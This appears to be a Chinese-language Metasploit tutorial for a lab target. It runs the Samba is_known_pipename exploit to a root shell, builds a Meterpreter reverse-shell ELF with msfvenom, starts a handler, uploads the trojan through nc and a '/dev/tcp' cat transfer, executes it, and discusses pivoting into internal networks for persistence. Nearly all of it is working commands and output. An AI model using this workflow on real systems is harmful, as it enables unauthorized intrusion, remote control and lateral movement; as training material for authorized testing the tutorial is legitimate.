

# 攻击思路

漏洞探测（信息收集） <- fsacn,namp 

|

漏洞利用 <- 工具（msf等）

|

获取服务器权限

# MSF 使用

Metasploit就是一个安全漏洞检测工具。它的全称叫做The Metasploit Framework，简称MSF。

MSF主要用于攻击非web端口

1、数据库

2、协议类型的端口


# 使用流程

Kali控制台 输入 `msfconsole` 进入

## 设置代理

setg Proxies socks5:127.0.0.1:1080

## 1、搜索并确认模块（search，use）

### search

如smb漏洞：执行 `search samba` 搜索相关漏洞

```bash
msf6 > search samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   4   post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations
   5   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules
   6   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   7   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   11  auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal
   12  auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   13  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   14  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   15  auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow
   16  auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow
   17  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   18  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   19  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   20  auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow
   21  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   22  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   23  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   24  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   25  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow

```


其中 exploit 为漏洞利用，auxiliary 为漏洞发现

### info

使用 `info` 命令可以查看漏洞详情，例如

```bash
msf6 > info exploit/linux/samba/is_known_pipename

       Name: Samba is_known_pipename() Arbitrary Module Load
     Module: exploit/linux/samba/is_known_pipename
   Platform: Linux
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2017-03-24

Provided by:
  steelo <knownsteelo@gmail.com>
  hdm <x@hdm.io>
  bcoles <bcoles@gmail.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic (Interact)
      1   Automatic (Command)
      2   Linux x86
      3   Linux x86_64
      4   Linux ARM (LE)
      5   Linux ARM64
      6   Linux MIPS
      7   Linux MIPSLE
      8   Linux MIPS64
      9   Linux MIPS64LE
      10  Linux PPC
      11  Linux PPC64
      12  Linux PPC64 (LE)
      13  Linux SPARC
      14  Linux SPARC64
      15  Linux s390x

Check supported:
  Yes

Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT           445              yes       The SMB service port (TCP)
  SMB_FOLDER                       no        The directory to use within the writeable SMB share
  SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory

Payload information:
  Space: 9000

Description:
  This module triggers an arbitrary shared library load vulnerability
  in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module
  requires valid credentials, a writeable folder in an accessible share,
  and knowledge of the server-side path of the writeable folder. In
  some cases, anonymous access combined with common filesystem locations
  can be used to automatically exploit this vulnerability.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2017-7494
  https://www.samba.org/samba/security/CVE-2017-7494.html


View the full module info with the info -d command.

```

### 漏洞利用，use

例如使用 smb漏洞，执行 `use exploit/linux/samba/is_known_pipename` 会进入一个漏洞终端

```bash
msf6 > use exploit/linux/samba/is_known_pipename
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(linux/samba/is_known_pipename) > 

```

## 2、设置模块参数（show，options，set）

### show options 查看模块设置

使用 `show options` 查看模块设置

```bash
msf6 exploit(linux/samba/is_known_pipename) > show options

# 模块设置
Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CHOST                            no        The local client address
   CPORT                            no        The local client port
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   # 目标                           yes 表示必填项
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   # 攻击端口号
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory

# 攻击载荷设置
Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

# 攻击目标设置
Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)



View the full module info with the info, or info -d command.

```

### 设置模块

```bash
# 设置靶机IP
set RHOSTS 10.3.4.126

# smb模块全局设置
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 1
```

## 3、运行模块（run）

设置完成后执行 `run`

```bash
msf6 exploit(linux/samba/is_known_pipename) > run

[*] 10.3.4.126:445 - Using location \\10.3.4.126\share\ for the path
[*] 10.3.4.126:445 - Retrieving the remote path of the share 'share'
[*] 10.3.4.126:445 - Share 'share' has server-side path '/tmp/
[*] 10.3.4.126:445 - Uploaded payload to \\10.3.4.126\share\CIkZEMwu.so
[*] 10.3.4.126:445 - Loading the payload from server-side path /tmp/CIkZEMwu.so using \\PIPE\/tmp/CIkZEMwu.so...
[-] 10.3.4.126:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.3.4.126:445 - Loading the payload from server-side path /tmp/CIkZEMwu.so using /tmp/CIkZEMwu.so...
[+] 10.3.4.126:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.168.198.226:37289 -> 10.3.4.126:445) at 2024-05-16 21:35:34 -0400
```

出现 

```bash
[*] Command shell session 1 opened (192.168.198.226:37289 -> 10.3.4.126:445) at 2024-05-16 21:35:34 -0400
```

表示攻击成功


输入 `bash -i` 进入终端

```bash
bash -i
bash: cannot set terminal process group (79): Inappropriate ioctl for device
bash: no job control in this shell
root@46d29b327da6:/# ls

```

# MSF 木马生成模块 Msfvenom

msfvenom

## 木马制作

Linux执行如下代码

```bash
#制作linux反弹shell木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

IP填写本机IP

PORT为本机监听端口

```bash
#制作linux反弹shell木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.198.226 LPORT=4444 -f elf > shell.elf
```



## 监听配置

msfvenom生成的远程控制木马需要和MSF中的`exploit/multi/handler`模块配合使用


```bash
# 使用 exploit/multi/handler 模块
use exploit/multi/handler
# 设置模块
set payload linux/x64/meterpreter/reverse_tcp
```

执行结果如下

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   # 本地监听地址，一般情况下0.0.0.0
   LHOST                   yes       The listen address (an interface may be specified)
   # 本地监听端口
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

```

开启监听

```bash
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:4444 
```

## 上传木马

由于服务器没有wget与curl命令，我们需要使用cat命令上传恶意木马

首先使用nc命令，监听999端口

```
nc -lvp 999 < shell.elf
``

之后在之前获取到的 `bash` 中执行以下命令


```bash
cat < /dev/tcp/<nc监听的IP>/999 > shell.elf
```

图片

![cat上传文件](/img/02/01_cat上传文件.png)


上传成功的效果如图上

然后需要在右边窗口停止 nc 运行

然后通过 `ls -l` 命令比对文件大小，确保文件上传完整

![ls比对文件大小](/img/02/02_比对文件大小.png)

## 执行

赋予 `shell.elf` 执行权限并运行

```bash
chmod +x ./shell.elf;./shell.elf
```

之后即可在 msfvenom 中看到 shell.elf 的请求

![控制成功](/img/02/03_控制成功.png)


获取 meterpreter 

## meterpreter 作用

发现靶机后，存在内网情况下，该靶机有机会成为跳板机，需要升级终端

meterpreter 可以使用 `background` 将终端挂起

通过 `sessions 1` 又能进入控制

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > 

```
常用命令

getuid：获取当前用户
getsystem：自动化提权，windows专享

文件上传：`/root/Desktop/tools/fscan` 源文件位置， 服务器位置 `/fscan`
```
upload /root/Desktop/tools/fscan /fscan
```



# 例一：SMB漏洞

通过namp，fscan等工具扫描端口

1、发现SMB服务器，第一步尝试直接访问

Windows直接通过文件管理器访问

Linux 可以直接用 `smbclient`

基本命令

```bash
# 列出共享文件夹
smbclient -L 10.3.4.126
# 进入共享文件夹
smbclient //10.3.4.126/share

Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 23 10:48:10 2022
  ..                                  D        0  Thu May 16 21:07:57 2024
  ydntgxhD.so                         A     8400  Tue Aug 23 10:47:53 2022
  WIJdzKgG.so                         A     8400  Tue Aug 23 10:48:10 2022

# 下载使用get
get ydntgxhD.so
```

2、根据服务版本寻找 N day 漏洞

3、之后流程见上面使用流程

4、攻击成功后，一般需要使用该服务器作为跳板机进入内网

执行上传木马（MSF木马）进行持久化控制

- 利用网络命令上传 wget，curl，cat

- 利用特殊工具 如：webshell 管理工具，meterpreter，stowaway


